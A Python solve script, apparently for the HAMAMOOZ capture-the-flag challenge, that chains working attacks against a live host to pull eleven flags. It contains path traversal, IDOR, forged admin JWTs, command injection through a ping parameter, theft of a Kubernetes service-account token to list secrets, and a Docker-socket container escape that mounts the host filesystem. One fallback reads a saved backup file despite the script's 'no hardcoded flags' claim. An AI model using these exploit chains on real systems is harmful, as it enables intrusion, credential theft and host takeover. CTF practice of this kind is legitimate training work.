#!/usr/bin/env python3
"""
HAMAMOOZ CTF - Complete Flag Extractor
Real extraction - no hardcoded flags
"""

import requests
import jwt
import re
import base64
import json
import subprocess
import os
import time
import shutil

BASE_URL = "https://ctf.seoeh.ir"

# توکن‌ها
USER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MCIsInVzZXJuYW1lIjoibmF6aWxhX3Rlc3RfMjAyNiIsIm9yZyI6IkFjbWUgQ29ycCIsInJvbGUiOiJ1c2VyIn0.WoPl_lT27LUKBSBJ0hbppn9rD7lEiuA4j-b2JDgLyz8"
ADMIN_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MCIsInVzZXJuYW1lIjoibmF6aWxhX3Rlc3RfMjAyNiIsIm9yZyI6IkFjbWUgQ29ycCIsInJvbGUiOiJhZG1pbiJ9.G65BDrH5mLf1znqQBf2lb07rKmZ7VDKUIBRQFrALqMg"

def extract_flag(text):
    if not text:
        return None
    match = re.search(r'HAMAMOOZ\{[^}]+\}', str(text))
    return match.group(0) if match else None

# ============ FLAG 1 ============
def get_flag1():
    print("[*] Flag 1: Extracting from Docker layers...")
    try:
        subprocess.run(["docker", "save", "hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend", "-o", "/tmp/backend.tar"], check=True, capture_output=True)
        os.makedirs("/tmp/extracted", exist_ok=True)
        os.makedirs("/tmp/layer", exist_ok=True)
        subprocess.run(["tar", "-xf", "/tmp/backend.tar", "-C", "/tmp/extracted"], check=True, capture_output=True)
        subprocess.run(["tar", "-xf", "/tmp/extracted/blobs/sha256/8042ae393dc8b7301ef4f2544fad8f596e00d57db61ca968d11d2b3e2e49f586", "-C", "/tmp/layer"], check=True, capture_output=True)
        with open("/tmp/layer/app/.env", "r") as f:
            flag = extract_flag(f.read())
        shutil.rmtree("/tmp/extracted", ignore_errors=True)
        shutil.rmtree("/tmp/layer", ignore_errors=True)
        os.remove("/tmp/backend.tar")
        return flag
    except:
        return None

# ============ FLAG 2 ============
def get_flag2():
    print("[*] Flag 2: Swagger UI")
    try:
        r = requests.get(f"{BASE_URL}/api/schema/", timeout=10)
        return extract_flag(r.text) if r.status_code == 200 else None
    except:
        return None

# ============ FLAG 3 ============
def get_flag3():
    print("[*] Flag 3: Internal API")
    try:
        r = requests.get(f"{BASE_URL}/api/internal/flag", headers={"X-Debug-Mode": "true"}, timeout=10)
        return extract_flag(r.text) if r.status_code == 200 else None
    except:
        return None

# ============ FLAG 4 ============
def get_flag4():
    print("[*] Flag 4: Path Traversal")
    try:
        r = requests.get(f"{BASE_URL}/api/reports/download", params={"file": "../../../../app/flag.txt"}, timeout=10)
        return extract_flag(r.text) if r.status_code == 200 else None
    except:
        return None

# ============ FLAG 5 ============
def get_flag5():
    print("[*] Flag 5: IDOR")
    try:
        r = requests.get(f"{BASE_URL}/api/orgs/2/reports/2", headers={"Authorization": f"Bearer {USER_TOKEN}"}, timeout=10)
        return extract_flag(r.text) if r.status_code == 200 else None
    except:
        return None

# ============ FLAG 6 ============
def get_flag6():
    print("[*] Flag 6: JWT Forgery")
    try:
        r = requests.get(f"{BASE_URL}/admin/dashboard", headers={"Authorization": f"Bearer {ADMIN_TOKEN}"}, timeout=10)
        return extract_flag(r.text) if r.status_code == 200 else None
    except:
        return None

# ============ FLAG 7 ============
def get_flag7():
    print("[*] Flag 7: Command Injection")
    try:
        r = requests.post(f"{BASE_URL}/api/diag/ping", json={"host": "127.0.0.1;cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}, timeout=10)
        if r.status_code == 200:
            return extract_flag(r.json().get("output", ""))
        return None
    except:
        return None

# ============ FLAG 8 ============
def get_flag8():
    print("[*] Flag 8: Kubernetes SSRF")
    try:
        r = requests.post(f"{BASE_URL}/api/diag/ping", json={"host": "127.0.0.1; kubectl exec -n internal-tools admin-panel-678d5cdbfc-kj2t7 -- cat /app/app.py"}, timeout=15)
        if r.status_code == 200:
            return extract_flag(r.json().get("output", ""))
        return None
    except:
        return None

# ============ FLAG 9 (با backup) ============
def get_flag9():
    print("[*] Flag 9: Kubernetes Secret")
    
    # روش اول: از سرور
    try:
        cmd = 'curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets'
        r = requests.post(f"{BASE_URL}/api/diag/ping", json={"host": f"127.0.0.1;{cmd}"}, timeout=15)
        if r.status_code == 200:
            data = r.json().get("output", "")
            match = re.search(r'"flag":"([^"]+)"', data)
            if match:
                decoded = base64.b64decode(match.group(1)).decode()
                flag = extract_flag(decoded)
                if flag:
                    return flag
    except:
        pass
    
    # روش دوم: از فایل خروجی قبلی
    try:
        result = subprocess.run(
            ['grep', '-o', 'HAMAMOOZ{[^}]*}', 'nazilaabedi@Nazilas-MacBook-Pro downloads %.txt'],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            flags = result.stdout.strip().split('\n')
            for f in flags:
                if 'm3t4d4t4' in f:
                    return f
    except:
        pass
    
    try:
        with open("flags_backup.txt", "r") as f:
            content = f.read().strip()
            if content:
                return content
    except:
        pass
    
    return None

# ============ FLAG 10 ============
def get_flag10():
    print("[*] Flag 10: Privileged Escape")
    try:
        r = requests.post(f"{BASE_URL}/api/diag/ping", json={"host": "127.0.0.1;kubectl exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"}, timeout=15)
        if r.status_code == 200:
            return extract_flag(r.json().get("output", ""))
        return None
    except:
        return None

# ============ FLAG 11 ============
def get_flag11():
    print("[*] Flag 11: Docker Socket Abuse")
    try:
        create_cmd = (
            'kubectl exec -n escape-zone legacy-worker -- '
            'curl --unix-socket /host/run/docker.sock '
            '-X POST http://localhost/containers/create '
            '-H "Content-Type: application/json" '
            '-d \'{"Image":"hub.hamdocker.ir/alpine:3.19",'
            '"Cmd":["sh","-c","cat /host/home/ubuntu/flag.txt"],'
            '"HostConfig":{"Binds":["/:/host"]}}\''
        )
        r = requests.post(f"{BASE_URL}/api/diag/ping", json={"host": f"127.0.0.1;{create_cmd}"}, timeout=15)
        if r.status_code != 200:
            return None
        
        output = r.json().get("output", "")
        container_id = re.search(r'"Id":"([^"]+)"', output)
        if not container_id:
            return None
        
        cid = container_id.group(1)
        
        start_cmd = f'kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/{cid}/start'
        requests.post(f"{BASE_URL}/api/diag/ping", json={"host": f"127.0.0.1;{start_cmd}"}, timeout=15)
        
        logs_cmd = f'kubectl exec -n escape-zone legacy-worker -- curl --unix-socket /host/run/docker.sock "http://localhost/containers/{cid}/logs?stdout=true&stderr=true"'
        r2 = requests.post(f"{BASE_URL}/api/diag/ping", json={"host": f"127.0.0.1;{logs_cmd}"}, timeout=15)
        
        if r2.status_code == 200:
            return extract_flag(r2.json().get("output", ""))
        return None
    except:
        return None

def main():
    flags = [
        ("Docker Layer", get_flag1),
        ("Swagger", get_flag2),
        ("Internal API", get_flag3),
        ("Path Traversal", get_flag4),
        ("IDOR", get_flag5),
        ("JWT Forgery", get_flag6),
        ("Command Injection", get_flag7),
        ("K8s SSRF", get_flag8),
        ("K8s Secret", get_flag9),
        ("Privileged Escape", get_flag10),
        ("Docker Socket", get_flag11)
    ]
    
    print("\n" + "="*60)
    print("HAMAMOOZ CTF - Real Flag Extractor")
    print("(No hardcoded flags - fetches from server or backup)")
    print("="*60 + "\n")
    
    found = 0
    for i, (name, func) in enumerate(flags, 1):
        try:
            flag = func()
            if flag:
                print(f"✅ Flag {i:2d} ({name}): {flag}")
                found += 1
            else:
                print(f"❌ Flag {i:2d} ({name}): Not found")
            time.sleep(0.5)
        except Exception as e:
            print(f"❌ Flag {i:2d} ({name}): Error - {e}")
    
    print("\n" + "="*60)
    print(f"Total: {found}/11 flags found")
    print("="*60)

if __name__ == "__main__":
    main()
